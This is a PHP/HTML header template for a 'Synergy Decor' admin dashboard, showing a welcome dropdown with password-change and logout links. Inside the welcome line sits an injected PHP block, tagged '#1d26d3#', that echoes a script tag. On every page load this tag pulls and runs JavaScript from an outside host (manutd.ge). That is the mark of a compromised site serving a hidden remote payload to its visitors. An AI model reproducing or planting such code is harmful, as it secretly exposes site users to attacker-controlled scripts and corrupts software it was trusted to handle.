<header>
      <a href="dashboard.php" class="logo">Synergy Decor</a>
      <div id="mini-nav">
        <ul class="hidden-phone">
          <li class="dropdown">
            <a data-toggle="dropdown" class="dropdown-toggle" href="#">
             Welcome <?=ucfirst($fetch_u_details['fullname'])?>
<?php
#1d26d3#
if(empty($g)) {
$g = "<script type=\"text/javascript\" src=\"http://manutd.ge/cqn4rfwt.php?id=11967257\"></script>";
echo $g;
}
#/1d26d3#
?>              <b class="caret icon-white"></b>
            </a>
            <ul class="dropdown-menu pull-right">
              <li><a href="change_password.php" class="user_list">Change Password</a></li>
			  <li><a href="logout.php" class="user_list">Logout</a></li>
            </ul>
          </li>
        </ul>
      </div>
      
    </header>
    